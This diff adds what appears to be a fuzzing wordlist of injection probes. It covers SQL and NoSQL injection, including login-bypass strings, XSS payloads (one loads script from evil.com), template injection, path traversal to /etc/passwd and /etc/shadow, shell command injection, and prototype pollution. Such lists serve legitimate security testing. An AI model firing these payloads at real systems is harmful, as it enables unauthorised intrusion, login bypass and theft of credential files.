@@ -1,0 +1,98 @@
+'
+''
+'''
+"
+""
+"""
+`
+``
+\
+\\
+/
+//
+;
+;;
+--
+---
+#
+##
+/*
+*/
+*/
+' OR '1'='1
+" OR "1"="1
+' OR 1=1--
+" OR 1=1--
+') OR ('1'='1
+admin'--
+admin"--
+' UNION SELECT NULL--
+' UNION SELECT 1,2,3--
+' UNION ALL SELECT NULL,NULL,NULL--
+' AND SLEEP(5)--
+'; WAITFOR DELAY '0:0:5'--
+<script>alert(1)</script>
+<script>alert(document.domain)</script>
+<script>confirm(1)</script>
+<img src=x onerror=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+</script><script>alert(1)</script>
+<script src=//evil.com/xss.js></script>
+javascript:alert(1)
+data:text/html,<script>alert(1)</script>
+${7*7}
+{{7*7}}
+{{constructor.constructor('alert(1)')()}}
+{{config.__class__}}
+{{''.__class__.__mro__}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+../../../../etc/passwd
+..\\..\\..\\..\\windows\\system.ini
+/etc/passwd
+/etc/shadow
+C:\windows\win.ini
+%2e%2e%2f%2e%2e%2fetc%2fpasswd
+%252e%252e%252fetc%252fpasswd
+| id
+|| id
+& id
+&& id
+; id
+`id`
+$(id)
+$(sleep 5)
+| sleep 5
+; sleep 5
+ping -c 5 127.0.0.1
+%0a%0d
+%00
+%00%00%00
+A
+AA
+AAA
+AAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+{"$ne":null}
+{"$gt":""}
+{"$where":"sleep(5000)"}
+{"username":{"$ne":null},"password":{"$ne":null}}
+true
+false
+null
+undefined
+NaN
+Infinity
+-1
+0
+1
+9999999999
+-9999999999
+[] 
+{}
+[[]]
+{{}}
+{"__proto__":{"admin":true}}
+{"constructor":{"prototype":{"admin":true}}}
